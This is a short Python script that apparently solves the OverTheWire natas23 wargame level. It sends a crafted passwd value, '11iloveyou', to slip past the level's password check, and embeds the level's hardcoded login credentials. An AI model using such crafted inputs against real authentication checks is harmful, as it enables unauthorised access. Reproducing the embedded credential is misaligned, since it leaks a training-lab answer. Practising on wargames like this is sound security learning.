#!/bin/python3
import requests
url = 'http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou'
r = requests.get(url,auth=('natas23','qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj'),allow_redirects=False)
print(r.text)
